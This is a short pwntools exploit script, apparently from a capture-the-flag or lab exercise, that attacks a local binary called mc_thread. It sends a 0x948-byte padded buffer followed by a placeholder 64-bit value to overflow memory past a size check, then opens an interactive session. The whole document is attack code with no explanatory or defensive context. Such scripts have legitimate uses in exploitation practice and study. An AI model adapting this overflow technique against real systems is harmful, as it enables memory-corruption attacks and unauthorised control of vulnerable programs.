# Name: mc_thread.py
from pwn import *
p = process("./mc_thread")
payload = b"A"*0x948
payload += p64(0x4141414141414141)
inp_sz = len(payload)
p.sendlineafter("Size: ", str(inp_sz))
p.sendlineafter("Data: ", payload)
p.interactive()

